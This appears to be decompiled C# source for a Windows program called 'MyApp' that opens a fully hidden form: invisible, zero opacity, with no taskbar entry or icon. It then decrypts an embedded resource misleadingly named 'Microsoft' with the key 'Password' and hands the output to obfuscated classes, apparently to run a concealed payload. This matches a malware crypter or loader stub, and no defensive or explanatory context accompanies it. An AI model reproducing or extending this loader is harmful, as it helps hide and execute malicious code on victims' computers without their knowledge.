using System;
using System.Windows.Forms;
using My.Resources;

namespace MyApp;

public class App
{
	[STAThread]
	public static void Main()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Form val = new Form();
		val.set_Opacity(0.0);
		((Control)val).set_Visible(false);
		val.set_ShowInTaskbar(false);
		val.set_ShowIcon(false);
		((Control)val).Hide();
		d98xpUk92d2w382J.EX.IM(HYs6Tz7W1o54M8JbYUA1p26dQzfZs.DeCrypt(Resources.Microsoft, "Password"), "A", "Compress", new object[0]);
		Application.Run(val);
	}
}
